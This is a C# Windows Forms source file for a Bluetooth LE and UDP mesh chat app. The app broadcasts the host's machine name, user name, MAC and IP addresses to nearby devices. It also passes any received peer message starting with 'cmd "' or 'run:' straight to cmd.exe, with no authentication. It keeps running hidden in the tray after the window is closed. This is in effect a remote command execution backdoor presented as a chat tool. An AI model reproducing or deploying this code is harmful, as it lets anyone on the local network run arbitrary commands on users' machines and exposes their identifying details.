using System;
using System.Drawing;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Windows.Devices.Bluetooth;
using Windows.Devices.Radios;

namespace WindowsBleMesh
{
    public class ChatForm : Form
    {
        private BlePublisher? _publisher;
        private BleWatcher? _watcher;
        private UdpMesh? _udpMesh;
        private NotifyIcon _trayIcon;
        private ListBox _messageList;
        private ListBox _deviceList;
        private TextBox _inputBox;
        private Button _sendButton;
        private bool _isSimulationMode = false;
        
        // Device identification
        private readonly DeviceInfo _localDevice;
        private readonly string _localId;
        private readonly DeviceRegistry _deviceRegistry = new();

        public ChatForm()
        {
            // Collect local device info on startup
            _localDevice = DeviceInfo.CollectLocalInfo();
            _localId = _localDevice.DeviceId;
            
            Console.WriteLine($"[DEVICE] Local Device ID: {_localId}");
            Console.WriteLine($"[DEVICE] Machine: {_localDevice.MachineName}");
            Console.WriteLine($"[DEVICE] User: {_localDevice.UserName}");
            Console.WriteLine($"[DEVICE] Platform: {_localDevice.Platform}");
            Console.WriteLine($"[DEVICE] MAC: {_localDevice.MACAddress}");
            Console.WriteLine($"[DEVICE] IPs: {string.Join(", ", _localDevice.IPAddresses)}");
            
            InitializeComponent();
            
            // Subscribe to device registry events
            _deviceRegistry.DeviceDiscovered += OnDeviceDiscovered;
            _deviceRegistry.DeviceUpdated += OnDeviceUpdated;
        }

        protected override async void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            try 
            {
                await InitializeBleAsync();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to initialize Bluetooth: {ex.Message}\nEnsure Bluetooth is turned ON.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void InitializeComponent()
        {
            this.Text = $"Windows BLE Mesh Chat - [{_localId}]";
            this.Size = new Size(700, 650);

            // Split panel for messages and devices
            var splitContainer = new SplitContainer();
            splitContainer.Dock = DockStyle.Fill;
            splitContainer.Orientation = Orientation.Vertical;
            splitContainer.SplitterDistance = 500;
            this.Controls.Add(splitContainer);

            _messageList = new ListBox();
            _messageList.Dock = DockStyle.Fill;
            _messageList.Font = new Font("Segoe UI", 10);
            splitContainer.Panel1.Controls.Add(_messageList);

            // Device list panel
            var devicePanel = new Panel();
            devicePanel.Dock = DockStyle.Fill;
            splitContainer.Panel2.Controls.Add(devicePanel);

            var deviceLabel = new Label();
            deviceLabel.Text = "Discovered Devices:";
            deviceLabel.Dock = DockStyle.Top;
            deviceLabel.Height = 20;
            deviceLabel.Font = new Font("Segoe UI", 9, FontStyle.Bold);
            devicePanel.Controls.Add(deviceLabel);

            _deviceList = new ListBox();
            _deviceList.Dock = DockStyle.Fill;
            _deviceList.Font = new Font("Consolas", 9);
            _deviceList.DoubleClick += DeviceList_DoubleClick;
            devicePanel.Controls.Add(_deviceList);
            _deviceList.BringToFront();

            var bottomPanel = new Panel();
            bottomPanel.Dock = DockStyle.Bottom;
            bottomPanel.Height = 60;
            this.Controls.Add(bottomPanel);
            bottomPanel.BringToFront();

            _sendButton = new Button();
            _sendButton.Text = "Send";
            _sendButton.Dock = DockStyle.Right;
            _sendButton.Width = 80;
            _sendButton.Click += SendButton_Click;
            bottomPanel.Controls.Add(_sendButton);

            _inputBox = new TextBox();
            _inputBox.Dock = DockStyle.Fill;
            _inputBox.Font = new Font("Segoe UI", 12);
            _inputBox.KeyDown += InputBox_KeyDown;
            bottomPanel.Controls.Add(_inputBox);

            // Tray Icon Setup
            _trayIcon = new NotifyIcon();
            _trayIcon.Icon = SystemIcons.Application;
            _trayIcon.Text = "Windows BLE Mesh";
            _trayIcon.Visible = true;
            _trayIcon.DoubleClick += (s, e) => 
            {
                this.Show();
                this.WindowState = FormWindowState.Normal;
            };

            var contextMenu = new ContextMenuStrip();
            contextMenu.Items.Add("Open", null, (s, e) => { this.Show(); this.WindowState = FormWindowState.Normal; });
            contextMenu.Items.Add("Exit", null, (s, e) => { Application.Exit(); });
            _trayIcon.ContextMenuStrip = contextMenu;
        }

        private async Task InitializeBleAsync()
        {
            // Initialize UDP Mesh (Wi-Fi)
            try
            {
                _udpMesh = new UdpMesh();
                _udpMesh.MessageReceived += OnMessageReceived;
                _udpMesh.Log += OnLog;
                _udpMesh.Start();
                AddMessage("System: UDP Mesh (Wi-Fi) initialized.");
            }
            catch (Exception ex)
            {
                AddMessage($"System: UDP Init Failed: {ex.Message}");
            }

            var adapter = await BluetoothAdapter.GetDefaultAsync();
            if (adapter == null)
            {
                EnableSimulationMode("Bluetooth Adapter not found.");
                return;
            }

            if (!adapter.IsLowEnergySupported)
            {
                EnableSimulationMode("BLE not supported.");
                return;
            }

            var radio = await adapter.GetRadioAsync();
            if (radio.State == Windows.Devices.Radios.RadioState.Off)
            {
                EnableSimulationMode("Bluetooth Radio is OFF.");
                return;
            }

            try
            {
                _publisher = new BlePublisher();
                _publisher.Log += OnLog;
                
                _watcher = new BleWatcher();
                _watcher.MessageReceived += OnMessageReceived;
                _watcher.Log += OnLog;
                _watcher.Start();
                
                AddMessage("System: Bluetooth initialized successfully.");
                AddMessage("System: Listening for messages...");
                
                // Broadcast device info on startup
                await BroadcastDeviceInfoAsync();
            }
            catch (Exception ex)
            {
                EnableSimulationMode($"Init failed: {ex.Message}");
            }
        }

        private async Task BroadcastDeviceInfoAsync()
        {
            AddMessage($"System: Broadcasting device info (ID: {_localId})...");
            Console.WriteLine($"[BROADCAST] Sending device info: {_localDevice.ToCompactString()}");
            
            string payload = _localDevice.ToCompactString();
            
            // Send via BLE
            if (_publisher != null)
            {
                try
                {
                    await _publisher.PublishMessageAsync(payload, 150, 5); // More repetitions for discovery
                    Console.WriteLine("[BROADCAST] BLE device info sent.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[BROADCAST] BLE Error: {ex.Message}");
                }
            }
            
            // Send via UDP
            if (_udpMesh != null)
            {
                try
                {
                    await _udpMesh.BroadcastMessageAsync(payload);
                    Console.WriteLine("[BROADCAST] UDP device info sent.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[BROADCAST] UDP Error: {ex.Message}");
                }
            }
            
            AddMessage("System: Device info broadcasted.");
        }

        private void EnableSimulationMode(string reason)
        {
            _isSimulationMode = true;
            AddMessage($"Warning: {reason}");
            AddMessage("System: Switched to SIMULATION MODE.");
            AddMessage("System: Messages will be simulated locally (Loopback).");
            _inputBox.Enabled = true;
            _sendButton.Enabled = true;
        }

        private void OnLog(object? sender, string message)
        {
            // Log to terminal only, not in application UI
            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] [LOG] {message}");
        }

        private void OnMessageReceived(object? sender, string message)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnMessageReceived(sender, message)));
                return;
            }

            Console.WriteLine($"[RX] Raw message: {message}");

            // Check if this is a device info broadcast
            if (message.StartsWith("DEV|"))
            {
                var deviceInfo = DeviceInfo.FromCompactString(message);
                if (deviceInfo != null)
                {
                    // Ignore own device info
                    if (deviceInfo.DeviceId == _localId)
                    {
                        Console.WriteLine("[RX] Ignored own device info.");
                        return;
                    }
                    
                    Console.WriteLine($"[DEVICE] Discovered: {deviceInfo}");
                    _deviceRegistry.RegisterDevice(deviceInfo);
                    return;
                }
            }

            // Filter Loopback Messages (legacy format: ID|message)
            int separatorIndex = message.IndexOf('|');
            if (separatorIndex > 0 && separatorIndex < 20) // ID can be up to 16 chars now
            {
                string senderId = message.Substring(0, separatorIndex);
                if (senderId == _localId)
                {
                    // Ignore own messages (loopback)
                    Console.WriteLine("[RX] Ignored loopback message (Self).");
                    return;
                }
                // Strip ID for processing
                message = message.Substring(separatorIndex + 1);
            }

            AddMessage($"Peer: {message}");

            // Remote Command Execution
            // Format: cmd "command_to_run"
            if (message.StartsWith("cmd \"", StringComparison.OrdinalIgnoreCase) && message.EndsWith("\""))
            {
                // Extract content between the quotes
                int startIndex = 5; // Length of 'cmd "'
                int length = message.Length - startIndex - 1; // -1 for the trailing "
                
                if (length > 0)
                {
                    string command = message.Substring(startIndex, length);
                    ExecuteCommand(command);
                }
            }
            // Legacy support or alternative format
            else if (message.StartsWith("run:", StringComparison.OrdinalIgnoreCase))
            {
                string command = message.Substring(4).Trim();
                ExecuteCommand(command);
            }
        }

        private void ExecuteCommand(string command)
        {
            try
            {
                AddMessage($"[System] Executing command: {command}");
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    UseShellExecute = true,
                    CreateNoWindow = false,
                    WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal
                });
            }
            catch (Exception ex)
            {
                AddMessage($"[System] Execution failed: {ex.Message}");
            }
        }

        private async void SendButton_Click(object? sender, EventArgs e)
        {
            string text = _inputBox.Text.Trim();
            if (string.IsNullOrEmpty(text)) return;

            _inputBox.Text = "";
            AddMessage($"Me: {text}");

            if (_isSimulationMode)
            {
                await Task.Delay(500); // Simulate network delay
                OnMessageReceived(this, text); // Loopback
                return;
            }

            // Attach Sender ID to prevent self-execution on loopback
            string payload = $"{_localId}|{text}";

            // Send via BLE
            if (_publisher != null)
            {
                try
                {
                    AddMessage("[System] Broadcasting via BLE...");
                    await _publisher.PublishMessageAsync(payload);
                    AddMessage("[System] BLE Broadcast Complete.");
                }
                catch (Exception ex)
                {
                    AddMessage($"Error sending BLE: {ex.Message}");
                }
            }
            else
            {
                AddMessage("[System] Warning: BLE Publisher is not initialized.");
            }

            // Send via UDP
            if (_udpMesh != null)
            {
                try
                {
                    AddMessage("[System] Broadcasting via UDP...");
                    await _udpMesh.BroadcastMessageAsync(payload);
                    AddMessage("[System] UDP Broadcast Complete.");
                }
                catch (Exception ex)
                {
                    AddMessage($"Error sending UDP: {ex.Message}");
                }
            }
            else
            {
                AddMessage("[System] Warning: UDP Mesh is not initialized.");
            }
        }

        private void InputBox_KeyDown(object? sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true;
                SendButton_Click(this, EventArgs.Empty);
            }
        }

        private void AddMessage(string msg)
        {
            _messageList.Items.Add($"[{DateTime.Now:HH:mm:ss}] {msg}");
            _messageList.TopIndex = _messageList.Items.Count - 1;
        }

        private void OnDeviceDiscovered(object? sender, DeviceInfo device)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnDeviceDiscovered(sender, device)));
                return;
            }
            
            AddMessage($"[NEW DEVICE] {device}");
            UpdateDeviceList();
            
            Console.WriteLine($"[DEVICE] NEW: {device.DeviceId} - {device.MachineName} ({device.UserName})");
            Console.WriteLine($"         Platform: {device.Platform}");
            Console.WriteLine($"         MAC: {device.MACAddress}");
            Console.WriteLine($"         IPs: {string.Join(", ", device.IPAddresses)}");
        }

        private void OnDeviceUpdated(object? sender, DeviceInfo device)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnDeviceUpdated(sender, device)));
                return;
            }
            
            UpdateDeviceList();
            Console.WriteLine($"[DEVICE] Updated: {device}");
        }

        private void UpdateDeviceList()
        {
            _deviceList.Items.Clear();
            foreach (var device in _deviceRegistry.GetAllDevices())
            {
                _deviceList.Items.Add($"[{device.DeviceId}] {device.MachineName} - {device.UserName}");
            }
        }

        private void DeviceList_DoubleClick(object? sender, EventArgs e)
        {
            if (_deviceList.SelectedIndex >= 0)
            {
                var devices = _deviceRegistry.GetAllDevices().ToList();
                if (_deviceList.SelectedIndex < devices.Count)
                {
                    var device = devices[_deviceList.SelectedIndex];
                    var details = $"Device ID: {device.DeviceId}\n" +
                                  $"Machine: {device.MachineName}\n" +
                                  $"User: {device.UserName}\n" +
                                  $"Platform: {device.Platform}\n" +
                                  $"MAC: {device.MACAddress}\n" +
                                  $"IPs: {string.Join(", ", device.IPAddresses)}\n" +
                                  $"Last Seen: {device.Timestamp}";
                    
                    MessageBox.Show(details, "Device Details", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;
                this.Hide();
                _trayIcon.ShowBalloonTip(1000, "Windows BLE Mesh", "Running in background...", ToolTipIcon.Info);
                return;
            }

            _watcher?.Stop();
            _udpMesh?.Stop();
            _trayIcon?.Dispose();
            base.OnFormClosing(e);
        }
    }
}
